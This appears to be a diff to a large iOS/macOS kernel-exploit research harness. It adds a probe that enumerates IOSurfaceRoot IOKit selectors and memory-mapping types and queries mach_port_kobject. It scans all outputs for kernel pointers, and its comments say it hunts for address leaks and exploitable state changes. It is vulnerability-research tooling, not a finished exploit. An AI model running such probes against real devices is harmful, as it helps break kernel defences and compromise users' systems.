@@ -16141,6 +16141,281 @@ static void r393_probe(void) {
 }
 
 /*
+ * r398: Direct IOKit interface enumeration.
+ *
+ * The IOSurface framework wraps IOKit calls and filters outputs. By calling
+ * IOConnectCallMethod directly with various selectors, we may find:
+ *   - Selectors that return kernel addresses in scalar/struct outputs
+ *   - Selectors that map additional memory types (beyond the backing store)
+ *   - Selectors that modify internal state in exploitable ways
+ *
+ * Also tests:
+ *   - mach_port_kobject (kernel object address from port)
+ *   - IOConnectMapMemory with types 0-15
+ *   - IOSurfaceGetPropertyMaximum/IOSurfaceGetPropertyCount
+ */
+static volatile int g_r398_crashed = 0;
+static sigjmp_buf g_r398_jmp;
+static void r398_sighandler(int sig) {
+    g_r398_crashed = sig;
+    siglongjmp(g_r398_jmp, 1);
+}
+
+static void r398_probe(void) {
+    rlog("\n=== r398: IOKit Interface Enumeration ===\n\n");
+    fflush(stdout);
+
+    struct sigaction sa398, old_bus398, old_segv398;
+    memset(&sa398, 0, sizeof(sa398));
+    sa398.sa_handler = r398_sighandler;
+    sa398.sa_flags = 0;
+    sigaction(SIGBUS, &sa398, &old_bus398);
+    sigaction(SIGSEGV, &sa398, &old_segv398);
+
+    /* ---- Phase 1: Open IOSurfaceRoot connection ---- */
+    rlog("  Phase 1: IOSurfaceRoot connection\n");
+
+    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
+        IOServiceMatching("IOSurfaceRoot"));
+    rlog("    IOSurfaceRoot service: 0x%x\n", service);
+    if (!service) {
+        rlog("    Cannot find IOSurfaceRoot — aborting\n");
+        goto r398_done;
+    }
+
+    io_connect_t conn = 0;
+    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
+    rlog("    IOServiceOpen: kr=0x%x conn=0x%x\n", kr, conn);
+    IOObjectRelease(service);
+    if (kr != KERN_SUCCESS || !conn) {
+        rlog("    Cannot open connection — aborting\n");
+        goto r398_done;
+    }
+
+    /* ---- Phase 2: Enumerate selectors 0-31 ---- */
+    rlog("\n  Phase 2: IOConnectCallMethod selector enumeration\n");
+
+    for (uint32_t sel = 0; sel < 32; sel++) {
+        uint64_t scalarOut[16] = {0};
+        uint32_t scalarOutCnt = 16;
+        uint8_t structOut[4096] = {0};
+        size_t structOutSize = sizeof(structOut);
+
+        kr = IOConnectCallMethod(conn, sel,
+            NULL, 0,  /* no scalar input */
+            NULL, 0,  /* no struct input */
+            scalarOut, &scalarOutCnt,
+            structOut, &structOutSize);
+
+        if (kr == KERN_SUCCESS) {
+            rlog("    sel=%u: OK scalarCnt=%u structSize=%zu\n",
+                sel, scalarOutCnt, structOutSize);
+            /* Print scalar outputs */
+            for (uint32_t i = 0; i < scalarOutCnt && i < 8; i++) {
+                rlog("      scalar[%u] = 0x%llx", i, (unsigned long long)scalarOut[i]);
+                if ((scalarOut[i] >> 48) == 0xffff || (scalarOut[i] >> 48) == 0xfffe) {
+                    rlog(" *** KERNEL PTR? ***");
+                }
+                rlog("\n");
+            }
+            /* Print first bytes of struct output if any */
+            if (structOutSize > 0 && structOutSize <= 4096) {
+                rlog("      struct[0..%zu]: ", structOutSize < 64 ? structOutSize : (size_t)64);
+                for (size_t j = 0; j < 64 && j < structOutSize; j++) rlog("%02x", structOut[j]);
+                rlog("\n");
+                /* Scan for kernel pointers in struct output */
+                for (size_t j = 0; j + 8 <= structOutSize; j += 8) {
+                    uint64_t qw = *(uint64_t*)(structOut + j);
+                    if ((qw >> 48) == 0xffff || (qw >> 48) == 0xfffe) {
+                        rlog("      *** KERNEL PTR at struct+%zu: 0x%llx ***\n",
+                            j, (unsigned long long)qw);
+                    }
+                }
+            }
+        } else if (kr != 0xe00002c2 && kr != 0xe00002bc) {
+            /* Skip common "bad index" and "invalid arg" errors */
+            rlog("    sel=%u: kr=0x%x\n", sel, kr);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Phase 3: Try selectors with a surface ID as input ---- */
+    rlog("\n  Phase 3: Selectors with surface ID input\n");
+
+    /* Create a test surface */
+    int w=64, h=64, bpe=4, bpr=64*4, pf_=0x42475241, as_=64*64*4;
+    CFMutableDictionaryRef tprops = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef tnW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef tnH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef tnB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef tnR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef tnP = CFNumberCreate(NULL, kCFNumberIntType, &pf_);
+    CFNumberRef tnA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFDictionarySetValue(tprops, CFSTR("IOSurfaceWidth"), tnW);
+    CFDictionarySetValue(tprops, CFSTR("IOSurfaceHeight"), tnH);
+    CFDictionarySetValue(tprops, CFSTR("IOSurfaceBytesPerElement"), tnB);
+    CFDictionarySetValue(tprops, CFSTR("IOSurfaceBytesPerRow"), tnR);
+    CFDictionarySetValue(tprops, CFSTR("IOSurfacePixelFormat"), tnP);
+    CFDictionarySetValue(tprops, CFSTR("IOSurfaceAllocSize"), tnA);
+
+    IOSurfaceRef testSurf = IOSurfaceCreate(tprops);
+    uint32_t testSid = IOSurfaceGetID(testSurf);
+    rlog("    Test surface: sid=%u\n", testSid);
+
+    /* Try selectors with surface ID as scalar input */
+    for (uint32_t sel = 0; sel < 32; sel++) {
+        uint64_t scalarIn[2] = { testSid, 0 };
+        uint64_t scalarOut[16] = {0};
+        uint32_t scalarOutCnt = 16;
+        uint8_t structOut[4096] = {0};
+        size_t structOutSize = sizeof(structOut);
+
+        kr = IOConnectCallMethod(conn, sel,
+            scalarIn, 1,
+            NULL, 0,
+            scalarOut, &scalarOutCnt,
+            structOut, &structOutSize);
+
+        if (kr == KERN_SUCCESS) {
+            rlog("    sel=%u(sid=%u): OK scalarCnt=%u structSize=%zu\n",
+                sel, testSid, scalarOutCnt, structOutSize);
+            for (uint32_t i = 0; i < scalarOutCnt && i < 8; i++) {
+                rlog("      scalar[%u] = 0x%llx", i, (unsigned long long)scalarOut[i]);
+                if ((scalarOut[i] >> 48) == 0xffff || (scalarOut[i] >> 48) == 0xfffe) {
+                    rlog(" *** KERNEL PTR? ***");
+                }
+                rlog("\n");
+            }
+            if (structOutSize > 0 && structOutSize <= 4096) {
+                rlog("      struct[0..%zu]: ", structOutSize < 64 ? structOutSize : (size_t)64);
+                for (size_t j = 0; j < 64 && j < structOutSize; j++) rlog("%02x", structOut[j]);
+                rlog("\n");
+                for (size_t j = 0; j + 8 <= structOutSize; j += 8) {
+                    uint64_t qw = *(uint64_t*)(structOut + j);
+                    if ((qw >> 48) == 0xffff || (qw >> 48) == 0xfffe) {
+                        rlog("      *** KERNEL PTR at struct+%zu: 0x%llx ***\n",
+                            j, (unsigned long long)qw);
+                    }
+                }
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Phase 4: IOConnectMapMemory with various types ---- */
+    rlog("\n  Phase 4: IOConnectMapMemory enumeration\n");
+
+    for (uint32_t memType = 0; memType < 16; memType++) {
+        mach_vm_address_t addr = 0;
+        mach_vm_size_t size = 0;
+
+        kr = IOConnectMapMemory64(conn, memType, mach_task_self(),
+            &addr, &size, kIOMapAnywhere);
+
+        if (kr == KERN_SUCCESS) {
+            rlog("    type=%u: addr=0x%llx size=0x%llx\n",
+                memType, (unsigned long long)addr, (unsigned long long)size);
+
+            /* Read first 128 bytes */
+            g_r398_crashed = 0;
+            if (sigsetjmp(g_r398_jmp, 1) == 0) {
+                uint8_t *mp = (uint8_t*)addr;
+                rlog("      first 64B: ");
+                for (int j = 0; j < 64 && j < (int)size; j++) rlog("%02x", mp[j]);
+                rlog("\n");
+
+                /* Scan for kernel pointers */
+                uint64_t *qp = (uint64_t*)addr;
+                int max_qw = (size < 1024 ? (int)size : 1024) / 8;
+                for (int j = 0; j < max_qw; j++) {
+                    if ((qp[j] >> 48) == 0xffff || (qp[j] >> 48) == 0xfffe) {
+                        rlog("      *** KERNEL PTR at +%d: 0x%llx ***\n",
+                            j*8, (unsigned long long)qp[j]);
+                    }
+                }
+            } else {
+                rlog("      CRASHED reading mapped memory: signal %d\n", g_r398_crashed);
+            }
+
+            IOConnectUnmapMemory64(conn, memType, mach_task_self(), addr);
+        } else if (kr != 0xe00002c2 && kr != 0xe00002bc && kr != 0xe00002bd) {
+            rlog("    type=%u: kr=0x%x\n", memType, kr);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Phase 5: mach_port_kobject ---- */
+    rlog("\n  Phase 5: mach_port_kobject / kernel object info\n");
+
+    /* Try mach_port_kobject on the IOKit connection port */
+    natural_t kotype = 0;
+    mach_vm_address_t koaddr = 0;
+    kr = mach_port_kobject(mach_task_self(), conn, &kotype, (mach_port_t*)&koaddr);
+    rlog("    mach_port_kobject(conn): kr=0x%x type=%u addr=0x%llx\n",
+        kr, kotype, (unsigned long long)koaddr);
+
+    /* Try on task port */
+    kr = mach_port_kobject(mach_task_self(), mach_task_self(), &kotype, (mach_port_t*)&koaddr);
+    rlog("    mach_port_kobject(task_self): kr=0x%x type=%u addr=0x%llx\n",
+        kr, kotype, (unsigned long long)koaddr);
+
+    /* Try on host port */
+    mach_port_t host = mach_host_self();
+    kr = mach_port_kobject(mach_task_self(), host, &kotype, (mach_port_t*)&koaddr);
+    rlog("    mach_port_kobject(host_self): kr=0x%x type=%u addr=0x%llx\n",
+        kr, kotype, (unsigned long long)koaddr);
+
+    /* ---- Phase 6: IOSurface metadata queries ---- */
+    rlog("\n  Phase 6: IOSurface metadata queries\n");
+
+    size_t propMaxW = IOSurfaceGetPropertyMaximum(CFSTR("IOSurfaceWidth"));
+    size_t propMaxH = IOSurfaceGetPropertyMaximum(CFSTR("IOSurfaceHeight"));
+    size_t propMaxA = IOSurfaceGetPropertyMaximum(CFSTR("IOSurfaceAllocSize"));
+    rlog("    PropertyMaximum: Width=%zu Height=%zu AllocSize=%zu\n", propMaxW, propMaxH, propMaxA);
+
+    uint32_t seedVal = 0;
+    IOReturn seedRet = IOSurfaceGetSeed(testSurf, &seedVal);
+    rlog("    IOSurfaceGetSeed: ret=0x%x seed=%u (0x%x)\n", seedRet, seedVal, seedVal);
+
+    /* Get surface's IOKit registry entry ID */
+    mach_port_t surfPort = IOSurfaceCreateMachPort(testSurf);
+    rlog("    IOSurfaceCreateMachPort: 0x%x\n", surfPort);
+    if (surfPort) {
+        kr = mach_port_kobject(mach_task_self(), surfPort, &kotype, (mach_port_t*)&koaddr);
+        rlog("    mach_port_kobject(surfPort): kr=0x%x type=%u addr=0x%llx\n",
+            kr, kotype, (unsigned long long)koaddr);
+        mach_port_deallocate(mach_task_self(), surfPort);
+    }
+
+    /* Try task_info TASK_DYLD_INFO */
+    struct task_dyld_info dyld_info = {0};
+    mach_msg_type_number_t dyld_info_count = TASK_DYLD_INFO_COUNT;
+    kr = task_info(mach_task_self(), TASK_DYLD_INFO,
+        (task_info_t)&dyld_info, &dyld_info_count);
+    rlog("    task_info(TASK_DYLD_INFO): kr=0x%x\n", kr);
+    if (kr == KERN_SUCCESS) {
+        rlog("      all_image_info_addr: 0x%llx\n",
+            (unsigned long long)dyld_info.all_image_info_addr);
+        rlog("      all_image_info_size: 0x%llx\n",
+            (unsigned long long)dyld_info.all_image_info_size);
+        rlog("      all_image_info_format: %d\n", dyld_info.all_image_info_format);
+    }
+    fflush(stdout);
+
+    /* Cleanup */
+    CFRelease(testSurf);
+    CFRelease(tprops);
+    IOServiceClose(conn);
+
+r398_done:
+    sigaction(SIGBUS, &old_bus398, NULL);
+    sigaction(SIGSEGV, &old_segv398, NULL);
+    rlog("\n=== r398 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r397: Dangling mapping + aggressive purgeable + property race.
  *
  * Key theories to test:
@@ -63200,6 +63475,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 401) {
+            rlog("*** rounds=401: IOKit Interface Enumeration ***\n");
+            rlog("  Direct selector calls, MapMemory types, mach_port_kobject, metadata.\n\n");
+            fflush(stdout);
+            r398_probe();
+            goto done;
+        }
         if (rounds == 400) {
             rlog("*** rounds=400: Dangling Mapping + Aggressive Purgeable + Race ***\n");
             rlog("  Stale mapping, 1.5GB pressure, concurrent property race, lookup-after-release.\n\n");
@@ -65592,7 +65874,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
